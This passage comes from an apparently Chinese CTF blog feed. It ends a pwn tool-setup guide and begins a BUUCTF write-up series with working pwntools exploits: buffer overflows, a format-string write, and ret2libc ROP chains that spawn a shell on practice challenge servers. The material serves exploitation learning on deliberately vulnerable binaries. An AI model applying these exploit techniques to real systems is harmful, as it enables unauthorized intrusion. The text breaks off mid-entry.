class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">功能</span><br><span class="line">libc : Print the base address of libc</span><br><span class="line">ld : Print the base address of ld</span><br><span class="line">codebase : Print the base of code segment</span><br><span class="line">heap : Print the base of heap</span><br><span class="line">got : Print the Global Offset Table infomation</span><br><span class="line">dyn : Print the Dynamic section infomation</span><br><span class="line">findcall : Find some function call</span><br><span class="line">bcall : Set the breakpoint at some function call</span><br><span class="line">tls : Print the thread local storage address</span><br><span class="line">at : Attach by process name</span><br><span class="line">findsyscall : Find the syscall</span><br><span class="line">fmtarg : Calculate the index of format string</span><br><span class="line">You need to stop on printf which has vulnerability.</span><br><span class="line">force : Calculate the nb in the house of force.</span><br><span class="line">heapinfo : Print some infomation of heap</span><br><span class="line">heapinfo (Address of arena)</span><br><span class="line">default is the arena of current thread</span><br><span class="line">If tcache is enable, it would show infomation of tcache entry</span><br><span class="line">heapinfoall : Print some infomation of heap (all threads)</span><br><span class="line">arenainfo : Print some infomation of all arena</span><br><span class="line">chunkinfo: Print the infomation of chunk</span><br><span class="line">chunkinfo (Address of victim)</span><br><span class="line">chunkptr : Print the infomation of chunk</span><br><span class="line">chunkptr (Address of user ptr)</span><br><span class="line">mergeinfo : Print the infomation of merge</span><br><span class="line">mergeinfo (Address of victim)</span><br><span class="line">printfastbin : Print some infomation of fastbin</span><br><span class="line">tracemalloc on : Trace the malloc and free and detect some error .</span><br><span class="line">You need to run the process first than tracemalloc on, it will record all of the malloc and free.</span><br><span class="line">You can set the DEBUG in pwngdb.py , than it will print all of the malloc and free infomation such as the screeshot.</span><br><span class="line">parseheap : Parse heap layout</span><br><span class="line">magic : Print useful variable and function in glibc</span><br><span class="line">fp : show FILE structure</span><br><span class="line">fp (Address of FILE)</span><br><span class="line">fpchain: show linked list of FILE</span><br><span class="line">orange : Test house of orange condition in the _IO_flush_lockp</span><br><span class="line">orange (Address of FILE)</span><br><span class="line">glibc version &lt;= 2.23</span><br></pre></td></tr></table></figure><p>pwndbg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh#建议挂魔法</span><br></pre></td></tr></table></figure><p>联合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br><span class="line">注释掉第一行 然后在第二行写入</span><br><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure><h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="安装ROPgadget"><a href="#安装ROPgadget" class="headerlink" title="安装ROPgadget"></a>安装ROPgadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line">cd ROPgadget</span><br><span class="line"> </span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><h2 id="安装ropper"><a href="#安装ropper" class="headerlink" title="安装ropper"></a>安装ropper</h2><p><code>pip3 install capstone filebytes unicorn keystone-engine ropper</code></p><h2 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install LibcSearcher</span><br><span class="line">sudo pip3 install -U LibcSearcher</span><br></pre></td></tr></table></figure><h2 id="安装main-arena-offset"><a href="#安装main-arena-offset" class="headerlink" title="安装main_arena_offset"></a>安装main_arena_offset</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dev2ero/py_main_arena_offset.git</span><br><span class="line">cd py_main_arena_offset</span><br><span class="line">sudo python3 setup.py develop</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pymao import *</span><br><span class="line"></span><br><span class="line">libc = &quot;./libc.so.6&quot;</span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line">print(hex(main_arena_offset))</span><br></pre></td></tr></table></figure><h2 id="安装本地调试不同版本的libc环境"><a href="#安装本地调试不同版本的libc环境" class="headerlink" title="安装本地调试不同版本的libc环境"></a>安装本地调试不同版本的libc环境</h2><p><strong>glibc-all-in-one</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br><span class="line">cat list</span><br><span class="line"> ./download [libc-version]</span><br></pre></td></tr></table></figure><p><strong>patchelf</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]</span><br><span class="line">patchelf --set-interpreter [libc-ld-path] [elf]</span><br><span class="line">cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug</span><br><span class="line">gdb [elf]</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只能说做pwn就是要遇到各种奇奇怪怪的问题</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题记录-1</title>
      <link href="/posts/13868/"/>
      <url>/posts/13868/</url>
      
        <content type="html"><![CDATA[<h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>题如其名</p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>入门题，防护全关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote() <span class="comment">#不固定就不写了</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x40118a</span>)) <span class="comment">#其实都比较建议跳过开头的开辟栈帧操作,要不然总是遇到一些奇奇怪怪的问题①</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>吃的大亏,现在才知道<strong>有些题目虽然有输出信息,但远程recv()是收不到东西会卡住的</strong></p><details class="folding-tag" yellow><summary> ① </summary>              <div class='content'>              <p>在一些比较新的环境下,如果覆盖返回地址的开头的操作为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>程序就会崩溃</p><p>至于原因,就是调用system时,栈没有对齐,如果不push rbp则对齐,故选择跳过</p><p>因此视情况跳过这两句代码</p>              </div>            </details><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>和上一题基本没有区别</p><p>只不过最后不是给shell权限而是直接cat flag罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x40060d</span>))</span><br><span class="line">p.interactive() <span class="comment">#虽然不是拿到shell但回到shell模式也能直接获得输出</span></span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>保护只开了nx</p><p>ida查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个思路</p><ol><li>直接溢出返回地址到cat /flag指令处</li><li>溢出修改v2,这个比较值是字面值可以在.rodata中找到</li></ol><p><strong>exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28933</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(<span class="number">0x4006BE</span>)) <span class="comment">#一开始好几次没成功,以为不行,结果是我打包成p32了</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>exp2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span>+p32(<span class="number">0x41348000</span>))<span class="comment">#这里就要p32了float是四字节,其实p64也行只不过会覆盖到返回地址</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>保护只开nx</p><p>ida查看</p><p>发现是c++代码,我这半桶水读起来有点吃力</p><p>直接运行看看,发现输入I会被替换为you,这样一个I能填充三个字节就可以做到溢出的效果了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048F10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>读一读源码</p><ol><li><p>fgets(s, 32, edata) ,edata其实也就是stdin了</p></li><li><p>使用 <code>std::string::operator=</code> 将 <code>s</code> 中的内容赋值给名为 <code>input</code> 的 <code>std::string</code> 对象。</p></li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v5</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了一个 <code>std::string</code> 对象 <code>v4</code>，其中包含字符串 “you”。</li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了另一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v7</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了另一个 <code>std::string</code> 对象 <code>v6</code>，其中包含字符串 “I”。</li><li>调用 <code>replace()</code> 函数，将 <code>input</code> 对象中的子字符串 “I” 替换为字符串 “you”.</li><li>使用 <code>std::string::operator=</code> 将 <code>v3</code> 变量中的字符串内容赋值给 <code>input</code> 对象，并在 <code>v6</code> 和 <code>v4</code> 的帮助下构造了一个新的字符串。</li><li>调用 <code>std::string</code> 和 <code>std::allocator</code> 的析构函数来释放已分配的内存。</li><li>将 <code>input</code> 中的字符串复制到 <code>s</code> 变量中。</li><li>使用 <code>printf()</code> 函数打印最终结果</li></ol><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>没什么好说的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x40059A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>保护查一查，开启了nx与canary</p><p>ida看一看，确定为格式化字符串漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-24_210019.png" alt=""></p><p>第一想法是dword_804c044有出现在参数中,那么栈中能找到能找到它,可以泄露其中的数据,再输入以通过</p><p>不过gdb调试发现read后的栈中它的地址已经被覆盖了,</p><p>那就只能选择任意地址写了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-24_210719.png" alt=""></p><p><strong>格式化字符串是第一个参数</strong>,那么输入内容的相对偏移是10</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;%12$nxxx&#x27;</span>+p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护,只开了nx</p><p>ida反汇编,程序为一个菜单式程序</p><p>没有system函数和/bin/sh字符串</p><p>基本确定为libc泄露类题</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-24_212742.png" alt=""></p><p>危险函数如上</p><p>这个循环会修改我们的输入但是有可以跳过的办法,即v0一定是一个大于零的数,则只要payload开头为<strong>\x00</strong>就行了</p><p><strong>exp</strong>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">e=ELF(<span class="string">&#x27;./12&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">padding=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span> <span class="comment">#这里脑抽，0x50换算成了十进制，填的时候又加了0x，被报错折磨了半个小时才发现，我好菜</span></span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)   <span class="comment">#puts自带换行</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#64位函数真实地址一般只占6个字节，且最高位为&#x27;\x7f&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  <span class="comment">#可以选择用Lincsearcher来直接pwntools中操作，但我还是选择用libcdatabase这个网站查询获得地址</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system)) <span class="comment">#这里有个栈对齐，下面说一说</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> pwntools中ELF获取plt </summary>              <div class='content'>              <p>即ELF.symbol,ELF.plt,ELF.got的使用区分</p><p>ELF.plt得到的是plt的地址,ELF.plt的内容首项是跳转到ELF.got中存储地址,ELF.got的内容是函数的真实加载地址</p><p>当需要访问函数的真实加载地址就需要访问ELF.got内容,但动态链接下,初始ELF.got项必然不是函数真实地址,且访问ELF.got又需要访问ELF.plt</p><p><strong>另外ELF.plt一定能进入函数,ELF.got则不一定(未初始化)</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-25_211747.png" alt=""></p><p>使用哪个,则要看需要访问的内容,要实现什么目的</p><p>再来看symbols和plt的使用场合</p><p>这两个很多时候返回是相同的(差不多可以当作一个用了,像这题,puts_plt=e.symbols[‘puts’也是可以的])</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ELF.symbols适用场景：</span><br><span class="line">查找特定符号的地址，例如函数的入口地址、全局变量的地址等。</span><br><span class="line">枚举可执行文件中的所有符号，例如枚举所有导出函数。优先考虑PLT条目，而不是GOT条目。</span><br><span class="line">ELF.plt适用场景：</span><br><span class="line">查找需要动态链接的函数的入口地址，例如为调用某个函数进行ROP攻击时。</span><br><span class="line">枚举需要动态链接的函数，例如枚举可执行文件依赖的所有共享库中的导出函数。</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" yellow><summary> 因为不严谨导致问题的细节 </summary>              <div class='content'>              <p>其实就是一些小细节</p><ol><li>send和sendline的使用,大多数时候二者没有差别,但是诸如遇到了getchar(),gets()这些函数,就只能用sendline(或者send自己加\n)了,因为这两个函数不接收到\n就不会继续执行,导致程序的执行卡住,不能往下执行</li><li>puts函数输出时会自带\n,接收时要注意</li></ol>              </div>            </details><details class="folding-tag" green><summary> 栈对齐 </summary>              <div class='content'>              <p>距离shell临门一脚的坑</p><p>ubuntu18(glibc2.27)后64位下</p><p>system函数执行过程中会有这么一条指令</p><p><code>movaps xmmword ptr [rsp + 0x??], xmm0</code></p><p>故而就要求在运行到该处时.rsp要是16的整数倍,</p><p>又由于程序指令的相对不变性,所以需要对<strong>system函数地址在栈中的存放地址有要求</strong></p><p>一般来说都是要使得<strong>system函数地址在栈中的存放地址要是16的整数倍</strong>(不一定),即能达到上述目的</p><p>除system外,printf等函数也会有这种指令,也就是上面提到的跳过栈帧开辟</p>              </div>            </details><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>ida一看,就是对一个数组进行输入,第14个元素如果等于17则拿到shell</p><p>唯一值得注意的就是</p><p><code>if ( *(_QWORD *)&amp;var[13] )</code>将dword指针变为了qword指针,所以第15个元素得留空,不过以防之前栈中存留了一些数据,也可以用p64打包直接覆盖</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26449</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="number">0x0</span>)*<span class="number">13</span>+p64(<span class="number">0x11</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>好几次遇到了同一个问题,进入shell模式后,第一条指令永远没有输出,虽然无伤大雅,且并不是每题都这样,但强迫症很难受啊</p><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>保护只开了nx</p><p>ida查看有system函数,而且能找到到binsh字符串</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">system=<span class="number">0x0804845C</span></span><br><span class="line">binsh=<span class="number">0x0804A024</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span>+p32(system)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>常规入门题</p><p>只不过read字符数由自己输入</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">p.recv()</span><br><span class="line">backdoor=<span class="number">0x4006EA</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>标准流程就不重复了,这题单看题不难,但坑是一个接着一个</p><p>第一个坑,ida显示的v4距返回地址计算出来应该是60,但是实际去gdb调试会发现应该是56,之前做了那么多题都是直接用ida给的数据,这次突然跳出来一个不准的确实很搞人（主要这题栈帧不是常见的类型）,也算得到了一个教训,最好还是gdb实操计算偏移,当然直接去读汇编代码也能得出正确结果</p><p>第二个大坑,就是这题没有设置setbuf(stdout，0)，所以本题的输出是缓存在服务器本地的，换句话说：如果程序不正常退出，本地是不会有输出的,所以必须要正常退出,其实这也应该是第一题我没能接收信息卡住的原因</p><p>更多可见基础杂烩篇</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27423</span>)</span><br><span class="line">backdoor=<span class="number">0x080489A0</span></span><br><span class="line">exit= <span class="number">0x0804E6A0</span>  <span class="comment">#很重要</span></span><br><span class="line">a1=<span class="number">0x308CD64F</span></span><br><span class="line">a2=<span class="number">0x195719D1</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(backdoor)+p32(exit)+p32(a1)+p32(a2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>保护开了got表不可写以及nx</p><p>ida查看</p><p>主体是<img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_220445.png" 